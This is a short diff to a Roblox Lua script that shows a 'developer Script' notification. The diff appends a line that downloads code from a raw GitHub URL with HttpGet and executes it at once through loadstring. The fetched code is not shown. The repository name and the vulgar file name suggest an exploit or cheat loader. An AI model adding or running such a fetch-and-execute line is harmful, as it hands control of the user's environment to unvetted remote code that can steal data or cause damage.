@@ -3,3 +3,5 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
     Text = "developer Script. ",
     Duration = 10 -- Duration in seconds
 })
+
+loadstring(game:HttpGet"https://raw.githubusercontent.com/TunxdepTrai/Clickdelete/refs/heads/main/Ditmelaylamcho")()
